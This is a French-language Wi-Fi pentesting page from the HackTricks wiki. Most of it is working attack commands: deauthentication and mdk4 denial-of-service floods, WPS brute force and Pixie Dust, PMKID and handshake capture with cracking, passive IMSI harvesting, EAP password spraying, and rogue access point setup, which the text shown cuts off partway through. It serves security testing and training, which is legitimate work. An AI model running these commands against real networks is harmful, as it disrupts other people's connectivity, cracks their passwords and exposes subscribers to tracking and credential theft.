# Pentesting Wifi

{{#include ../../banners/hacktricks-training.md}}

## Commandes de base pour le Wifi
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
airodump-ng wlan0mon --wps #Scan WPS
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
iwlist wlan0 scan #Scan available wifis
```
## Outils

### Hijacker & NexMon (Wi‑Fi interne d'Android)


{{#ref}}
enable-nexmon-monitor-and-injection-on-android.md
{{#endref}}

### EAPHammer
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**Exécuter airgeddon avec docker**
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
Source : [https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux](https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux)

### wifiphisher

Il peut effectuer des attaques Evil Twin, KARMA et Known Beacons, puis utiliser un template de phishing pour obtenir le mot de passe réel du réseau ou capturer des credentials de réseaux sociaux.
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

Cet outil automatise les attaques **WPS/WEP/WPA-PSK**. Il va automatiquement :

- Place l'interface en monitor mode
- Scanne les réseaux disponibles - et vous permet de sélectionner la/les victime(s)
- Si WEP - Lance des attaques WEP
- Si WPA-PSK
- Si WPS: Pixie dust attack et the bruteforce attack (attention, the brute-force attack peut prendre beaucoup de temps). Remarque : il n'essaie pas les null PIN ni les database/generated PINs.
- Tente de capturer le PMKID depuis l'AP to crack it
- Tente de deauthenticate les clients de l'AP to capture a handshake
- Si PMKID ou Handshake, tente de bruteforce en utilisant top5000 passwords.

## Résumé des attaques

- **DoS**
- Deauthentication/disassociation -- Déconnecte tout le monde (ou un ESSID/Client spécifique)
- Random fake APs -- Masquer les réseaux, possible crash des scanners
- Overload AP -- Essaie de tuer l'AP (généralement pas très utile)
- WIDS -- Jouer avec le IDS
- TKIP, EAPOL -- Quelques attaques spécifiques pour DoS certains APs
- **Cracking**
- Crack **WEP** (plusieurs outils et méthodes)
- **WPA-PSK**
- **WPS** pin "Brute-Force"
- **WPA PMKID** bruteforce
- \[DoS +] **WPA handshake** capture + Cracking
- **WPA-MGT**
- **Username capture**
- **Bruteforce** Credentials
- **Evil Twin** (with or without DoS)
- **Open** Evil Twin \[+ DoS] -- Utile pour capturer des creds de captive portal et/ou effectuer des attaques LAN
- **WPA-PSK** Evil Twin -- Utile pour des attaques réseau si vous connaissez le mot de passe
- **WPA-MGT** -- Utile pour capturer des credentials d'entreprise
- **KARMA, MANA**, **Loud MANA**, **Known beacon**
- **+ Open** -- Utile pour capturer des creds de captive portal et/ou effectuer des attaques LAN
- **+ WPA** -- Utile pour capturer des WPA handshakes

## DOS

### Deauthentication Packets

**Description depuis** [**here**:](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

Les attaques **Deauthentication**, une méthode répandue dans le hacking Wi‑Fi, consistent à forger des "management" frames pour **déconnecter de force des appareils d'un réseau**. Ces paquets non-chiffrés trompent les clients en leur faisant croire qu'ils proviennent du réseau légitime, permettant aux attaquants de collecter des WPA handshakes pour des fins de cracking ou de perturber de façon persistante les connexions réseau. Cette tactique, alarmante par sa simplicité, est largement utilisée et a des implications importantes pour la sécurité des réseaux.

**Deauthentication using Aireplay-ng**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
- -0 signifie deauthentication
- 1 est le nombre de deauths à envoyer (vous pouvez en envoyer plusieurs si vous le souhaitez) ; 0 signifie les envoyer en continu
- -a 00:14:6C:7E:40:80 est l'adresse MAC de l'access point
- -c 00:0F:B5:34:30:30 est l'adresse MAC du client à deauthenticate ; si ceci est omis alors une broadcast deauthentication est envoyée (ne fonctionne pas toujours)
- ath0 est le nom de l'interface

### Disassociation Packets

**Disassociation packets**, similaires aux deauthentication packets, sont un type de trame de management utilisé dans les réseaux Wi‑Fi. Ces paquets servent à rompre la connexion entre un appareil (comme un laptop ou un smartphone) et un access point (AP). La distinction principale entre disassociation et deauthentication réside dans leurs scénarios d'utilisation. Alors qu'un AP émet **deauthentication packets to remove rogue devices explicitly from the network, disassociation packets are typically sent when the AP is undergoing a shutdown**, un redémarrage ou un déplacement, nécessitant ainsi la déconnexion de tous les nœuds connectés.

**Cette attaque peut être réalisée par mdk4(mode "d"):**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **Plus d'attaques DOS par mdk4**

**Dans** [**here**](https://en.kali.tools/?p=864)**.**

**ATTACK MODE b: Beacon Flooding**

Envoie des beacon frames pour afficher de faux APs aux clients. Cela peut parfois faire planter les network scanners et même les drivers!
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**ATTACK MODE a: Authentication Denial-Of-Service**

Envoyer des authentication frames à tous les Access Points (APs) accessibles à portée peut surcharger ces APs, surtout lorsque de nombreux clients sont impliqués. Ce trafic intense peut provoquer une instabilité du système, entraînant le blocage de certains APs voire leur redémarrage.
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**ATTACK MODE p: SSID Probing and Bruteforcing**

Probing Access Points (APs) vérifie si un SSID est correctement révélé et confirme la portée de l'AP. Cette technique, couplée au **bruteforcing hidden SSIDs** avec ou sans wordlist, aide à identifier et à accéder aux réseaux dissimulés.

**ATTACK MODE m: Michael Countermeasures Exploitation**

L'envoi de paquets aléatoires ou dupliqués vers différentes files d'attente QoS peut déclencher Michael Countermeasures sur les **TKIP APs**, entraînant la coupure de l'AP pendant une minute. Cette méthode est une tactique d'attaque **DoS** (Denial of Service) efficace.
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**MODE D'ATTAQUE e: EAPOL Start and Logoff Packet Injection**

Inonder un AP avec des **EAPOL Start frames** crée des **sessions factices**, surchargeant l'AP et bloquant les clients légitimes. Alternativement, l'injection de **fausses EAPOL Logoff messages** déconnecte de force les clients ; les deux méthodes perturbent efficacement le service réseau.
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**ATTACK MODE s: Attaques pour les réseaux maillés IEEE 802.11s**

Diverses attaques sur la gestion des liaisons et le routage dans les réseaux maillés.

**ATTACK MODE w: WIDS Confusion**

La connexion croisée de clients à plusieurs nœuds WDS ou à de faux rogue APs peut manipuler les Intrusion Detection and Prevention Systems, créant de la confusion et d'éventuels abus du système.
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**ATTACK MODE f: Packet Fuzzer**

Un packet fuzzer offrant diverses sources de paquets et un ensemble complet de modificateurs pour la manipulation des paquets.

### **Airggedon**

_**Airgeddon**_ offre la plupart des attaques proposées dans les commentaires précédents :

![](<../../images/image (95).png>)

## WPS

WPS (Wi‑Fi Protected Setup) simplifie le processus de connexion des appareils à un routeur, accélérant et facilitant la configuration des réseaux chiffrés avec **WPA** ou **WPA2** Personal. Il n'est pas adapté à la sécurité WEP, facilement compromise. WPS utilise un PIN de 8 chiffres, validé en deux moitiés, ce qui le rend vulnérable aux attaques par brute force en raison du nombre limité de combinaisons (11 000 possibilités).

### WPS Bruteforce

Il existe 2 outils principaux pour effectuer cette action : Reaver et Bully.

- **Reaver** a été conçu pour être une attaque robuste et pratique contre WPS, et a été testé sur une grande variété d'access points et d'implémentations WPS.
- **Bully** est une **nouvelle implémentation** de l'attaque de force brute WPS, écrite en C. Elle présente plusieurs avantages par rapport au code original de reaver : moins de dépendances, meilleures performances mémoire et CPU, gestion correcte de l'endianness, et un ensemble d'options plus robuste.

L'attaque exploite la vulnérabilité du **WPS PIN**, en particulier l'exposition des quatre premiers chiffres et le rôle du dernier chiffre comme checksum, facilitant l'attaque par brute force. Cependant, des défenses contre les attaques par brute force, comme **blocking MAC addresses** des attaquants agressifs, exigent **MAC address rotation** pour poursuivre l'attaque.

En obtenant le WPS PIN avec des outils comme Bully ou Reaver, l'attaquant peut déduire le PSK WPA/WPA2, assurant **persistent network access**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**Smart Brute Force**

Cette approche affinée vise les WPS PINs en exploitant des vulnérabilités connues :

1. **Pre-discovered PINs** : Utiliser une base de données de PINs connus associés à des fabricants connus pour utiliser des WPS PINs uniformes. Cette base corrèle les trois premiers octets des MAC-addresses avec les PINs probables pour ces fabricants.
2. **PIN Generation Algorithms** : S'appuyer sur des algorithmes comme ComputePIN et EasyBox, qui calculent les WPS PINs en fonction du MAC-address de l'AP. L'algorithme Arcadyan nécessite en plus un device ID, ajoutant une couche au processus de génération de PIN.

### WPS Pixie Dust attack

**Dominique Bongard** a découvert une faille dans certains points d'accès (APs) concernant la création de codes secrets, appelés **nonces** (**E-S1** et **E-S2**). Si ces nonces peuvent être déterminés, cracker le WPS PIN de l'AP devient facile. L'AP révèle le PIN à l'intérieur d'un code spécial (hash) pour prouver qu'il est légitime et non un AP faux (rogue). Ces nonces sont essentiellement les "keys" pour déverrouiller le "safe" qui contient le WPS PIN. More on this can be found [here](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>).

En termes simples, le problème est que certains APs n'utilisaient pas des clés suffisamment aléatoires pour chiffrer le PIN pendant le processus de connexion. Cela rend le PIN vulnérable à être deviné depuis l'extérieur du réseau (offline brute force attack).
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
Si vous ne voulez pas passer l'appareil en monitor mode, ou si `reaver` et `bully` rencontrent des problèmes, vous pouvez essayer [OneShot-C](https://github.com/nikita-yfh/OneShot-C). Cet outil peut effectuer une Pixie Dust attack sans avoir à passer en monitor mode.
```bash
./oneshot -i wlan0 -K -b 00:C0:CA:78:B1:37
```
### Null Pin attack

Certains systèmes mal conçus permettent même à un **Null PIN** (un PIN vide ou inexistant) d'accorder l'accès, ce qui est assez inhabituel. L'outil **Reaver** est capable de tester cette vulnérabilité, contrairement à **Bully**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

Toutes les attaques WPS proposées peuvent être facilement effectuées en utilisant _**airgeddon.**_

![](<../../images/image (219).png>)

- 5 et 6 vous permettent d'essayer **votre PIN personnalisé** (si vous en avez un)
- 7 et 8 effectuent la **Pixie Dust attack**
- 13 vous permet de tester le **NULL PIN**
- 11 et 12 vont **récupérer les PINs liés à l'AP sélectionné depuis des bases de données disponibles** et **générer** des **PINs** possibles en utilisant : ComputePIN, EasyBox et optionnellement Arcadyan (recommandé, pourquoi pas ?)
- 9 et 10 testeront **tous les PINs possibles**

## **WEP**

Tellement cassé et plus utilisé de nos jours. Sachez juste que _**airgeddon**_ propose une option WEP appelée "All-in-One" pour attaquer ce type de protection. D'autres outils offrent des options similaires.

![](<../../images/image (432).png>)

---

---

## WPA/WPA2 PSK

### PMKID

En 2018, **hashcat** [revealed](https://hashcat.net/forum/thread-7717.html) une nouvelle méthode d'attaque, unique car elle n'a besoin que d'**un seul paquet** et ne requiert pas que des clients soient connectés à l'AP ciblé — seulement une interaction entre l'attaquant et l'AP.

Beaucoup de routeurs modernes ajoutent un **champ optionnel** au **premier EAPOL** frame lors de l'association, connu sous le nom `Robust Security Network`. Celui-ci inclut le `PMKID`.

Comme l'explique le post original, le **PMKID** est créé en utilisant des données connues :
```bash
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
Étant donné que le "PMK Name" est constant, que nous connaissons le BSSID de l'AP et de la station, et que le `PMK` est identique à celui d'un full 4-way handshake, **hashcat** peut utiliser cette information pour crack le PSK et recover la passphrase !

Pour **gather** ces informations et **bruteforce** localement le password, vous pouvez faire :
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
Les **PMKIDs capturés** seront affichés dans la **console** et aussi **enregistrés** dans \_ **/tmp/attack.pcap**\_\
Maintenant, convertissez la capture au format **hashcat/john** et crack it:
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
Veuillez noter que le format d'un hash correct contient **4 parties**, comme : `4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7566f6461666f6e65436f6e6e6563743034383131343838` Si le vôtre **ne contient que** **3 parties**, alors, il est **invalide** (la capture PMKID n'était pas valide).

Notez que `hcxdumptool` **capture aussi des handshakes** (quelque chose comme ceci apparaîtra : **`MP:M1M2 RC:63258 EAPOLTIME:17091`**). Vous pouvez **transformer** les **handshakes** au format **hashcat**/**john** en utilisant `cap2hccapx`
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
_J'ai remarqué que certains handshakes capturés avec cet outil n'ont pas pu être cracked même en connaissant le mot de passe correct. Je recommande de capturer également des handshakes par la méthode traditionnelle si possible, ou d'en capturer plusieurs avec cet outil._

### Handshake capture

Une attaque contre des réseaux **WPA/WPA2** peut être réalisée en capturant un **handshake** et en tentant de **crack** le mot de passe **offline**. Ce processus consiste à surveiller la communication d'un réseau spécifique et le **BSSID** sur un **channel** particulier. Voici un guide simplifié :

1. Identifiez le **BSSID**, le **channel**, et un **client connecté** du réseau cible.
2. Utilisez `airodump-ng` pour surveiller le trafic réseau sur le **channel** et le **BSSID** spécifiés, en espérant capturer un handshake. La commande ressemblera à ceci:
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
3. Pour augmenter les chances de capturer un handshake, déconnectez momentanément le client du réseau pour forcer une réauthentification. Cela peut être fait en utilisant la commande `aireplay-ng`, qui envoie des deauthentication packets au client:
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, may not work in all scenarios
```
_Notez que, si le client a été deauthenticated, il peut tenter de se connecter à un AP différent ou, dans d'autres cas, à un réseau différent._

Une fois que des informations de handshake apparaissent dans `airodump-ng`, cela signifie que le handshake a été capturé et vous pouvez arrêter d'écouter :

![](<../../images/image (172) (1).png>)

Une fois le handshake capturé, vous pouvez le **crack** avec `aircrack-ng` :
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### Vérifier si un handshake est présent dans le fichier

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark**
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_Si cet outil trouve un handshake incomplet d'un ESSID avant le handshake complété, il ne détectera pas le handshake valide._

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
## **WPA Enterprise (MGT)**

Dans **les environnements WiFi d'entreprise, vous rencontrerez différentes méthodes d'authentification**, chacune offrant des niveaux de sécurité et des fonctionnalités de gestion différents. Lorsque vous utilisez des outils comme `airodump-ng` pour inspecter le trafic réseau, vous pouvez remarquer des identifiants pour ces types d'authentification. Quelques méthodes courantes comprennent :
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
1. **EAP-GTC (Generic Token Card)**:
- Cette méthode prend en charge les hardware tokens et les one-time passwords au sein d'EAP-PEAP. Contrairement à MSCHAPv2, elle n'utilise pas de peer challenge et envoie les mots de passe en clair vers l'access point, exposant un risque de downgrade attacks.
2. **EAP-MD5 (Message Digest 5)**:
- Implique l'envoi du hash MD5 du mot de passe depuis le client. Ce n'est **pas recommandé** en raison de sa vulnérabilité aux attaques par dictionnaire, de l'absence d'authentification serveur et de l'incapacité à générer des clés WEP spécifiques à la session.
3. **EAP-TLS (Transport Layer Security)**:
- Utilise des certificats côté client et côté serveur pour l'authentification et peut générer dynamiquement des clés WEP par utilisateur et par session pour sécuriser les communications.
4. **EAP-TTLS (Tunneled Transport Layer Security)**:
- Fournit une authentification mutuelle via un tunnel chiffré, ainsi qu'une méthode pour dériver des clés WEP dynamiques par utilisateur et par session. Il nécessite uniquement des certificats côté serveur, les clients utilisant des credentials.
5. **PEAP (Protected Extensible Authentication Protocol)**:
- Fonctionne de manière similaire à EAP en créant un tunnel TLS pour les communications protégées. Il permet l'utilisation de protocoles d'authentification plus faibles au-dessus d'EAP grâce à la protection offerte par le tunnel.
- **PEAP-MSCHAPv2**: Souvent appelé PEAP, il combine le mécanisme challenge/response vulnérable de MSCHAPv2 avec un tunnel TLS protecteur.
- **PEAP-EAP-TLS (or PEAP-TLS)**: Similaire à EAP-TLS mais initie un tunnel TLS avant l'échange des certificats, offrant une couche de sécurité supplémentaire.

You can find more information about these authentication methods [here ](https://en.wikipedia.org/wiki/Extensible_Authentication_Protocol)and [here](https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html).

### Capture du nom d'utilisateur

Reading [https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27) il semble que si vous utilisez **EAP** les **"Identity"** **messages** doivent être **supportés**, et le **username** va être envoyé en **clair** dans les **"Response Identity"** messages.

Même en utilisant l'une des méthodes d'authentification les plus sécurisées : **PEAP-EAP-TLS**, il est possible de **capturer le username envoyé dans le protocole EAP**. Pour ce faire, **capturez une communication d'authentification** (lancez `airodump-ng` sur un canal et `wireshark` sur la même interface) et filtrez les paquets par `eapol`.\
À l'intérieur du paquet "**Response, Identity**", le **nom d'utilisateur** du client apparaîtra.

![](<../../images/image (850).png>)

### Identités anonymes

Le masquage d'identité est supporté à la fois par EAP-PEAP et EAP-TTLS. Dans le contexte d'un réseau WiFi, une requête EAP-Identity est typiquement initiée par l'access point (AP) pendant le processus d'association. Pour garantir la protection de l'anonymat des utilisateurs, la réponse du client EAP sur l'appareil de l'utilisateur contient uniquement les informations essentielles requises pour que le RADIUS initial traite la requête. Ce concept est illustré par les scénarios suivants :

- EAP-Identity = anonymous
- Dans ce scénario, tous les utilisateurs emploient le pseudonyme "anonymous" comme identifiant utilisateur. Le RADIUS initial agit en tant que serveur EAP-PEAP ou EAP-TTLS, responsable de la gestion du côté serveur du protocole PEAP ou TTLS. La méthode d'authentification interne (protégée) est alors soit gérée localement, soit déléguée à un RADIUS distant (home).
- EAP-Identity = anonymous@realm_x
- Dans cette situation, les utilisateurs de différents realms cachent leur identité tout en indiquant leur realm respectif. Cela permet au RADIUS initial de proxy les requêtes EAP-PEAP ou EAP-TTLS vers les serveurs RADIUS de leur realm home, qui jouent le rôle de serveur PEAP ou TTLS. Le RADIUS initial fonctionne uniquement comme un nœud relais RADIUS.
- Alternativement, le RADIUS initial peut fonctionner comme serveur EAP-PEAP ou EAP-TTLS et soit gérer la méthode d'authentification protégée, soit la transférer à un autre serveur. Cette option facilite la configuration de politiques distinctes pour différents realms.

Dans EAP-PEAP, une fois le tunnel TLS établi entre le serveur PEAP et le client PEAP, le serveur PEAP initie une requête EAP-Identity et la transmet à travers le tunnel TLS. Le client répond à cette seconde requête EAP-Identity en envoyant une réponse EAP-Identity contenant la véritable identité de l'utilisateur à travers le tunnel chiffré. Cette approche empêche efficacement la révélation de la véritable identité de l'utilisateur à toute personne écoutant le trafic 802.11.

EAP-TTLS suit une procédure légèrement différente. Avec EAP-TTLS, le client s'authentifie typiquement en utilisant PAP ou CHAP, sécurisé par le tunnel TLS. Dans ce cas, le client inclut un attribut User-Name et soit un attribut Password soit CHAP-Password dans le message TLS initial envoyé après l'établissement du tunnel.

Quel que soit le protocole choisi, le serveur PEAP/TTLS obtient la connaissance de la véritable identité de l'utilisateur après l'établissement du tunnel TLS. La véritable identité peut être représentée comme user@realm ou simplement user. Si le serveur PEAP/TTLS est également responsable de l'authentification de l'utilisateur, il possède maintenant l'identité de l'utilisateur et procède avec la méthode d'authentification protégée par le tunnel TLS. Alternativement, le serveur PEAP/TTLS peut transférer une nouvelle requête RADIUS vers le RADIUS home de l'utilisateur. Cette nouvelle requête RADIUS omet la couche protocole PEAP ou TTLS. Dans les cas où la méthode d'authentification protégée est EAP, les messages EAP internes sont transmis au RADIUS home sans l'enveloppe EAP-PEAP ou EAP-TTLS. L'attribut User-Name du message RADIUS sortant contient la véritable identité de l'utilisateur, remplaçant le User-Name anonymous de la requête RADIUS entrante. Lorsque la méthode d'authentification protégée est PAP ou CHAP (supporté uniquement par TTLS), le User-Name et autres attributs d'authentification extraits de la charge utile TLS sont substitués dans le message RADIUS sortant, remplaçant le User-Name anonymous et les attributs TTLS EAP-Message présents dans la requête RADIUS entrante.

For more info check [https://www.interlinknetworks.com/app_notes/eap-peap.htm](https://www.interlinknetworks.com/app_notes/eap-peap.htm)

### SIM-based EAP (EAP-SIM/EAP-AKA) identity leakage (IMSI exposure)

SIM-based Wi‑Fi authentication using EAP‑SIM/EAP‑AKA over 802.1X can leak the permanent subscriber identifier (IMSI) in cleartext during the unauthenticated identity phase if the deployment doesn’t implement pseudonyms/protected identities or a TLS tunnel around the inner EAP.

Where the leak happens (high level):
- 802.11 association completes to the SSID (often carrier offload SSIDs like FreeWifi_secure, eduroam-like operator realms, etc.).
- Authenticator sends EAP-Request/Identity.
- Vulnerable clients answer EAP-Response/Identity with their permanent identity = IMSI encoded as a 3GPP NAI, prior to any protection.
- Example NAI: 20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
- Anyone passively listening to RF can read that frame. No 4-way handshake or TLS keying is needed.

Quick PoC: passive IMSI harvesting on EAP‑SIM/AKA networks lacking identity privacy
<details>
<summary>Click to expand</summary>
```bash
# 1) Enable monitor mode
airmon-ng start wlan0

# 2) Optional: lock channel to the target BSS
airodump-ng wlan0mon --essid <SSID>

# 3) Capture 802.1X/EAP frames
# Wireshark display filters:
#   eap || eapol
#   (identity specifically): eap.code == 2 && eap.type == 1
# Kismet: add source wlan0mon; enable 802.1X/EAP views
# tcpdump (pcap capture):
#   tcpdump -i wlan0mon -s 0 -w eapsim_identity.pcap

# 4) Wait for a device to auto-connect to the SSID
# 5) Inspect the first EAP-Response/Identity frame
# Expected: ASCII NAI containing IMSI, e.g.
#   20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
```
</details>

Remarques :
- Fonctionne avant tout tunnel TLS si le déploiement utilise EAP‑SIM/AKA nu sans identité protégée/pseudonymes.
- La valeur exposée est un identifiant permanent lié à la SIM de l'abonné ; sa capture permet le suivi à long terme et des abus télécom en aval.

Impact
- Confidentialité : suivi persistant des utilisateurs/appareils à partir de captures Wi‑Fi passives dans des lieux publics.
- Démarrage d'abus télécom : avec l'IMSI, un attaquant disposant d'un accès SS7/Diameter peut interroger la localisation ou tenter l'interception d'appels/SMS et le vol de MFA.

Mesures d'atténuation / éléments à vérifier
- Vérifier que les clients utilisent des identités externes anonymes (pseudonymes) pour EAP‑SIM/AKA conformément aux recommandations 3GPP (par ex. 3GPP TS 33.402).
- Privilégier le tunneling de la phase d'identité (par ex. EAP‑TTLS/PEAP transportant un EAP‑SIM/AKA interne) afin que l'IMSI ne soit jamais envoyé en clair.
- Les captures de paquets d'association/auth ne doivent jamais révéler un IMSI brut dans EAP-Response/Identity.

Related: Exploitation de la signalisation télécom avec des identifiants mobiles capturés
{{#ref}}
../pentesting-network/telecom-network-exploitation.md
{{#endref}}

### EAP-Bruteforce (password spray)

If the client is expected to use a **nom d'utilisateur et un mot de passe** (notice that **EAP-TLS won't be valid** in this case), then you could try to get a **liste** de **noms d'utilisateur** (see next part) et de **mots de passe** et tenter de **bruteforcer** l'accès en utilisant [**air-hammer**](https://github.com/Wh1t3Rh1n0/air-hammer)**.**
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
Vous pouvez également effectuer cette attaque en utilisant `eaphammer`:
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
## Théorie des attaques client

### Sélection du réseau et itinérance

- Le protocole 802.11 définit comment une station rejoint un Extended Service Set (ESS) mais ne précise pas les critères de sélection d'un ESS ni d'un access point (AP) à l'intérieur.
- Les stations peuvent itinérer entre plusieurs AP partageant le même ESSID, conservant la connectivité à travers un bâtiment ou une zone.
- Le protocole exige l'authentification de la station auprès de l'ESS mais n'impose pas l'authentification de l'AP envers la station.

### Preferred Network Lists (PNL)

- Les stations stockent l'ESSID de chaque réseau sans fil auquel elles se connectent dans leur Preferred Network List (PNL), ainsi que les paramètres de configuration spécifiques au réseau.
- La PNL est utilisée pour se connecter automatiquement aux réseaux connus, améliorant l'expérience utilisateur en simplifiant le processus de connexion.

### Passive Scanning

- Les AP diffusent périodiquement des beacon frames, annonçant leur présence et leurs caractéristiques, y compris l'ESSID de l'AP sauf si la diffusion est désactivée.
- Lors du passive scanning, les stations écoutent les beacon frames. Si l'ESSID d'un beacon correspond à une entrée dans la PNL de la station, celle-ci peut se connecter automatiquement à cet AP.
- La connaissance de la PNL d'un appareil permet une exploitation potentielle en imitant l'ESSID d'un réseau connu, trompant l'appareil pour qu'il se connecte à un AP rogue.

### Active Probing

- L'active probing consiste pour les stations à envoyer des probe requests afin de découvrir les AP proches et leurs caractéristiques.
- Les directed probe requests ciblent un ESSID spécifique, aidant à détecter si un réseau particulier est à portée, même s'il s'agit d'un réseau caché.
- Les broadcast probe requests ont le champ SSID nul et sont envoyées à tous les AP proches, permettant à la station de vérifier la présence de n'importe quel réseau préféré sans divulguer le contenu de sa PNL.

## Simple AP with redirection to Internet

Avant d'expliquer comment réaliser des attaques plus complexes, il sera expliqué **comment** simplement **créer** un **AP** et **rediriger** son **trafic** vers une interface connectée **à** l'**Internet**.

Using `ifconfig -a` check that the wlan interface to create the AP and the interface connected to the Internet are present.

### DHCP & DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
Créez le fichier de configuration `/etc/dnsmasq.conf` :
```ini
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
Ensuite, **définissez les adresses IP** et **les routes** :
```bash
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
Puis **démarrez** dnsmasq:
```bash
dnsmasq -C dnsmasq.conf -d
```
### hostapd
```bash
apt-get install hostapd
```
Créer un fichier de configuration `hostapd.conf` :
```ini
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**Arrêter les processus gênants** , activer **monitor mode**, et **démarrer hostapd**:
```bash
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### Transfert et redirection
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
